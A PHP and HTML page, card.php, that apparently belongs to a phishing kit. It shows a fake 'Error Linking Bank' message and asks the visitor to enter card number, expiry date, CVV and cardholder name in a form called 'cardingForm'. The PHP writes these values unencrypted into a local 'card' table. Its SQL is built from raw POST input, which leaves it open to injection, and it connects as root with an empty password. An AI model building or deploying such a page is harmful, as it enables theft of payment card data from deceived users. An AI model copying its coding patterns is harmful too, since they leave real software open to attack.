<?php

    $errorcardnumber = "";
    $errorinputExpDate = "";
	$errorcvv = "";
	$errorcardname = "";
	$errorMessage = "";
	$num_rows = 0;
	//============================================
	//	FUNCTION TO ESCAPE DANGEROUS SQL CHARACTERS
	//============================================
	function quote_smart($value, $handle) {
		if (get_magic_quotes_gpc()) {
			$value = stripslashes($value);
		}
		if (!is_numeric($value)) {
			$value = "'" . mysql_real_escape_string($value, $handle) . "'";
		}
		return $value;
	}//end function
	 

	if ($_SERVER['REQUEST_METHOD'] == 'POST'){//Start server request
     
	    //====================================================================
	    //	GETS AND CHECKS THE POSTS FOR DANGEROUS CHARCTERS
	    //====================================================================
	    $cardnumber = $_POST['cardnumber'];
	    $inputExpDate = $_POST['inputExpDate'];
	    $cvv = $_POST['cvv'];
	    $cardname = $_POST['cardname'];

        $date = date('Y-m-d H:i:s');
     
	    //===============================
	    //    WRITING TO THE DATABASE    
	    //===============================
	    //If the error variables are blank, proceed.

	    //THIS CODE READS DATA FROM YOUR DATABASE AND WRITES IT  
	    //IN YOUR PHP OUTPUT
        $user_name = "root";
        $pass_word = "";
	    $database = "mission";
	    $server = "127.0.0.1";
	 
        // Create connection
	    $conn = mysqli_connect($server, $user_name, $pass_word, $database);

	    // Check connection
	    if (!$conn) {
            die("Connection failed: " . mysqli_connect_error());
        }
        else {
            $SQL = "INSERT INTO card (cardnumber,    
            exp, cvv, cardname, date) VALUES  
            ('$cardnumber','$inputExpDate','$cvv','$cardname','$date')";
		    //Used to send a sql query to your database

		    //Execute sql query
            $result = mysqli_query($conn, $SQL);
            //print "result value " . $result;

            if ($result){
			    $debugmessages = "Inserted successfully<br>";
                header ("Location: success.html");
			    $returnvalue = 1;
		    }
		    else {
                header ("Location: failure.html");
			    $returnvalue = 0;
		    }

            // Close connection
		    if ($conn) {
			    mysqli_close ($conn);
			    $debugmessages = "Connection closed<br>";
		    }
        }
	        
	 
	   
	 
	 
	}//End server request

    else{//data wasn't posted
        //echo "no";
    }
?>

<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8" />
    <title>Credit Card Payment Form Template | PrepBootstrap</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />

    <link rel="stylesheet" type="text/css" href="bootstrap/css/bootstrap.min.css" />
    <link rel="stylesheet" type="text/css" href="font-awesome/css/font-awesome.min.css" />

    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    <script type="text/javascript" src="bootstrap/js/bootstrap.min.js"></script>
    <script type="text/javascript" src="bootstrap/js/cardvalidator.js"></script>
    <script>
        $(document).ready(function() {
            //alert("Username must be between 2 and 30 characters");
        });

        function formatString(e) {
        var inputChar = String.fromCharCode(event.keyCode);
        var code = event.keyCode;
        var allowedKeys = [8];
        if (allowedKeys.indexOf(code) !== -1) {
            return;
        }

        event.target.value = event.target.value.replace(
        /^([1-9]\/|[2-9])$/g, '0$1/' // 3 > 03/
        ).replace(
        /^(0[1-9]|1[0-2])$/g, '$1/' // 11 > 11/
        ).replace(
        /^([0-1])([3-9])$/g, '0$1/$2' // 13 > 01/3
        ).replace(
        /^(0?[1-9]|1[0-2])([0-9]{2})$/g, '$1/$2' // 141 > 01/41
        ).replace(
        /^([0]+)\/|[0]+$/g, '0' // 0/ > 0 and 00 > 0
        ).replace(
        /[^\d\/]|^[\/]*$/g, '' // To allow only digits and `/`
        ).replace(
        /\/\//g, '/' // Prevent entering more than 1 `/`
        );
        }


        function validateCard() {
            var cardnumber = document.forms["cardingForm"]["cardnumber"].value;
            var inputExpDate = document.forms["cardingForm"]["inputExpDate"].value;
            var cvv = document.forms["cardingForm"]["cvv"].value;
            var cardname = document.forms["cardingForm"]["cardname"].value;

            //document.forms["bankingForm"]["bank"].value = $("#banks option:selected").text();
            //alert("bank now2: " + $("#banks option:selected").text());
            
            if (cardnumber.length <= 15 || username.length >= 23) {
                alert("Incorrect Card Number");
                return false;
            }

            if (inputExpDate.length <= 3 || inputExpDate.length >= 6) {
                alert("Incorrect Expiry Date");
                return false;
            }

            if (cvv.length <= 2 || cvv.length >= 6) {
                alert("Incorrect CVV Code");
                return false;
            }

            if (cardname.length <= 2 || cardname.length >= 50) {
                alert("Please, Enter Appropriate Card Name");
                return false;
            }
        }
    </script>
</head>
<body>

<div class="containono">
<header class="site-header">
            <div class="container">
                <div class="site-header-inner">
                    <div class="brand header-brand">
                        <h1 class="m-0">
							<img class="header-logo-image topImage" src="src/images/logo-negative.svg" alt="Logo">
                        </h1>
                    </div>
                </div>
            </div>
        </header>
    
    <div class="page-header">
        <center><h1 style="color:gray">Error Linking Bank, <small>Please Try Another Payment Method</small></h1></center>
    </div>

<!-- Credit Card Payment Form - START -->

<div class="containono">
    <div class="rownono">
        <div class="col-xs-12 col-md-4 col-md-offset-4">
            <div class="panel panel-default">
                <div class="panel-heading">
                    <div class="rownono">
                        <h3 class="text-center">Payment Details</h3>
                        <img class="img-responsive cc-img" src="src/images/creditcardicons.png">
                    </div>
                </div>
                <div class="panel-body">
                    <form role="form" name="cardingForm" action="card.php" method="POST" onsubmit="return validateCard();">
                        <div class="rownono">
                            <div class="col-xs-12">
                                <div class="form-group">
                                    <label>CARD NUMBER</label>
                                    <div class="input-group">
                                        <input type="text" name="cardnumber" class="form-control ccFormatMonitor" placeholder="Valid Card Number" maxlength='19'  />
                                        <span class="input-group-addon"><span class="fa fa-credit-card"></span></span>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div class="rownono">
                            <div class="col-xs-7 col-md-7">
                                <div class="form-group">
                                    <label><span class="hidden-xs">EXPIRATION</span><span class="visible-xs-inline">EXP</span> DATE</label>
                                    <input type="text" name="inputExpDate" class="form-control" placeholder="MM / YY" maxlength='5' onkeyup="formatString(event);" />
                                </div>
                            </div>
                            <div class="col-xs-5 col-md-5 pull-right">
                                <div class="form-group">
                                    <label>CVV CODE</label>
                                    <input type="password" name="cvv" class="form-control cvv" placeholder="CVV" maxlength='4' />
                                </div>
                            </div>
                        </div>
                        <div class="rownono">
                            <div class="col-xs-12">
                                <div class="form-group">
                                    <label>CARD OWNER</label>
                                    <input type="text" name="cardname" class="form-control" placeholder="Card Owner Names" />
                                </div>
                            </div>
                        </div>
                        <div class="panel-footer">
                            <div class="rownono">
                                <!-- <div class="col-xs-12"> -->
                                    <button class="btn btn-warning btn-lg btn-block" name="processbutton" type="submit">Process payment</button>
                                <!-- </div> -->
                            </div>
                        </div>
                    </form>
                </div>
                
            </div>
        </div>
    </div>
</div>

<style>
    .cc-img {
        margin: 0 auto;
    }
</style>
<!-- Credit Card Payment Form - END -->

</div>

</body>
</html>